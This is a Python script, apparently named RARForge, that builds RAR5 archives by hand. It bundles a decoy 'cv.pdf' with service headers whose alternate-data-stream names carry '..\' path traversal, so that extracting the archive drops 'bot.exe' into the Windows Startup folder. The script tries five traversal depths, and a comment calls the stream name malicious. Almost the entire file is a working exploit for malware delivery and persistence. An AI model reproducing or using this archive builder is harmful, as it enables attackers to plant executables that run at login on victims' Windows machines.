#!/usr/bin/env python3
import os
import zlib

class Utilz:
    def __init__(self):
        pass

    @staticmethod
    def crc32_zlib(data):
        crc = zlib.crc32(data) & 0xffffffff
        return crc
    
    @staticmethod
    def encode_vint(value: int) -> bytes:
        if value < 0:
            raise ValueError("Value must be >= 0")
        
        if value == 0:
            return b"\x00"
        
        bytes_list = []

        while value > 0:
            byte_val = value & 0x7F
            value >>= 7

            if value > 0:
                byte_val |= 0x80

            bytes_list.append(byte_val)
        
        return bytes(bytes_list)
    
    @staticmethod
    def extract_file_info(file_path):
        try:
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"{file_path} does not exists")
            if os.path.isdir(file_path):
                raise IsADirectoryError(f"{file_path} is a directory")
            
            filename = os.path.basename(file_path)

            with open(file_path, "rb") as file:
                content = file.read()

            size = len(content)
            return filename, content, size
        
        except FileNotFoundError:
            raise
        except PermissionError:
            raise PermissionError(f"Insufficient access rights on {file_path}")
        except Exception as e:
            raise Exception(f"Error reading {file_path}: {e}")
        
    @staticmethod
    def int_to_min_bytes(value: int) -> bytes:
        if value < 0:
            raise ValueError("Value must be >= 0")
        
        nbytes= (value.bit_length() + 7) // 8 or 1
        return value.to_bytes(nbytes, "little")
    
class RARForge:
    def __init__(self, archivename):
        self.archivename = archivename
        self.file= None
        self.signature= b"\x52\x61\x72\x21\x1A\x07\x01\x00"
        self.utilz =Utilz
    
    def open(self):
        try:
            self.file = open(self.archivename, "wb")
        except Exception as e:
            print (f"Error opening rar archive {e}")
            raise

    def close(self):
        if self.file and not self.file.closed:
            self.file.close()
    
    def write(self, payload):
        self.file.write(payload)
    
    def get_rar5_signature(self):
        return self.signature
    
    def get_main_archive_hdr(self):
        mah = b"\x03" #header size
        mah += b"\x01" #header type
        mah += b"\x00" #flags
        mah += b"\x00" #extra area size

        crc = self.utilz.crc32_zlib(mah)
        return crc.to_bytes(4, "little") + mah
    
    def build_file_hdr(self, filename):
        resource, content, size = self.utilz.extract_file_info(filename)

        file_hdr = []
        file_hdr.append(b'\x02') #header type
        file_hdr.append(b'\x02') #flags: data area is present in the end of header
        file_hdr.append(self.utilz.encode_vint(size)) #data size
        file_hdr.append(b'\x04') #file flag: CRC32 field is present
        file_hdr.append(self.utilz.encode_vint(size)) #unpack size
        file_hdr.append(b'\x20') #attributes
        file_hdr.append(self.utilz.crc32_zlib(content).to_bytes(4, "little")) #data crc
        file_hdr.append(b'\x00') #compression
        file_hdr.append(b'\x00') #host OS: Windows
        file_hdr.append(self.utilz.int_to_min_bytes(len(resource)))
        file_hdr.append(resource.encode())
        hdr_size = sum(len(n) for n in file_hdr)
        file_hdr.insert(0,  self.utilz.int_to_min_bytes(hdr_size)) #header size
        file_hdr.insert(0, self.utilz.crc32_zlib(b''.join(file_hdr)).to_bytes(4, "little")) #header crc32 
        #print(file_hdr)
        file_hdr.append(content)

        return b''.join(file_hdr)
    
    def build_service_data_record(self, stream_name):
        svc_data_record = []
        svc_data_record.append(b'\x07') #header type
        svc_data_record.append(stream_name.encode()) #malicious stream name
        record_size = sum (len(n) for n in svc_data_record)
        svc_data_record.insert(0, self.utilz.int_to_min_bytes(record_size)) #record size
        #print(svc_data_record)

        return b''.join(svc_data_record)
    
    def build_service_header(self, filename, stream_name):
        resource, content, size = self.utilz.extract_file_info(filename)

        svc_hdr = []
        svc_hdr.append(b'\x03') #header type
        svc_hdr.append(b'\x23') #flags: Block depends on preceding file Block | Data area is present in the end of header | Extra area is present in the end of header
        extra_area = self.build_service_data_record(stream_name)
        svc_hdr.append(self.utilz.int_to_min_bytes(len(extra_area))) #extra area size
        svc_hdr.append(self.utilz.encode_vint(size)) #data size
        svc_hdr.append(b'\x04') #file flag: CRC32 field is present
        svc_hdr.append(self.utilz.encode_vint(size)) #unpack size
        svc_hdr.append(b'\x00') #attributes
        svc_hdr.append(self.utilz.crc32_zlib(content).to_bytes(4, "little")) #data crc
        svc_hdr.append(b'\x00') #compression
        svc_hdr.append(b'\x00') #host OS: Windows
        svc_hdr.append(b'\x03') #service header name length
        svc_hdr.append("STM".encode()) # Name
        svc_hdr.append(extra_area) #extra area
        hdr_size = sum (len(n) for n in svc_hdr)
        svc_hdr.insert(0, self.utilz.int_to_min_bytes(hdr_size)) #header size
        svc_hdr.insert(0, self.utilz.crc32_zlib(b''.join(svc_hdr)).to_bytes(4, 'little')) #header crc32
        
        svc_hdr.append(content)
        #print(svc_hdr)

        return b''.join(svc_hdr)

def main1():
    inputval = b"\x03\x01\x00\x00"
    util = Utilz()
    outputvalue = util.crc32_zlib(inputval)

    #print(hex(outputvalue))
    print(outputvalue.to_bytes(4,"little"))

def main2():
    rar = RARForge('test.rar')
    rar.open()
    rar.write(rar.get_rar5_signature()) #signature
    
    main= rar.get_main_archive_hdr() #main archive header
    rar.write(main)

    rar.close()

def main3():
    util = Utilz()
    vint= util.encode_vint(3405)
    print(vint)

def main4():
    rar = RARForge('test1.rar')
    rar.open()
    rar.write(rar.get_rar5_signature()) #signature
    
    main = rar.get_main_archive_hdr() #main archive header
    rar.write(main)

    file1_hdr = rar.build_file_hdr("./samples/cv.pdf")
    rar.write(file1_hdr)

    rar.close()

def main5():
    rar = RARForge('test2.rar')
    rar.open()
    rar.write(rar.get_rar5_signature()) #signature
    
    main = rar.get_main_archive_hdr() #main archive header
    rar.write(main)

    file1_hdr = rar.build_file_hdr("./samples/cv.pdf")
    rar.write(file1_hdr)

    stream1 = rar.build_service_header("./samples/bot.exe", r":\.\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")
    rar.write(stream1)

    rar.close()

def main():
    rar = RARForge('test3.rar')
    rar.open()
    rar.write(rar.get_rar5_signature()) #signature
    
    main = rar.get_main_archive_hdr() #main archive header
    rar.write(main)

    file1_hdr = rar.build_file_hdr("./samples/cv.pdf")
    rar.write(file1_hdr)

    stream1 = rar.build_service_header("./samples/bot.exe", r":\.\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")
    stream2 = rar.build_service_header("./samples/bot.exe", r":\.\\..\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")
    stream3 = rar.build_service_header("./samples/bot.exe", r":\.\\..\\..\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")
    stream4 = rar.build_service_header("./samples/bot.exe", r":\.\\..\\..\\..\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")
    stream5 = rar.build_service_header("./samples/bot.exe", r":\.\\..\\..\\..\\..\\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.exe")

    rar.write(stream1)
    rar.write(stream2)
    rar.write(stream3)
    rar.write(stream4)
    rar.write(stream5)

    rar.close()



if __name__== "__main__":
    main()

